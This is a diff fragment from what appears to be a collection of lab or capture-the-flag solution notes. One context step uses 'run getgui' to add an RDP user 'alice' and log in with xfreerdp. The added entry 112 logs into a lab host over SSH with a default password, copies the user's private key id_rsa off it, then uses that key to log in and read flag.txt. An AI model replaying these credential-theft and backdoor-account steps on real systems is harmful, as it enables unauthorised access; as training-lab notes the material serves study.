@@ -2127,8 +2127,22 @@ migrate 2764
 run getgui -e -u alice -p hack_123321
 xfreerdp /u:alice /p:hack_123321 /v:10.0.23.139
 ```
-
-
+112)
+```
+ip addr
+ssh student@192.37.104.3
+Enter password “password”
+ls -al
+scp student@192.37.104.3:~/.ssh/id_rsa .
+Enter password “password”.
+ssh student@192.37.104.3
+Enter password “password”.
+rm wait
+chmod 400 id_rsa
+ssh -i id_rsa student@192.37.104.3
+ls -l
+cat flag.txt
+```
 
 
 
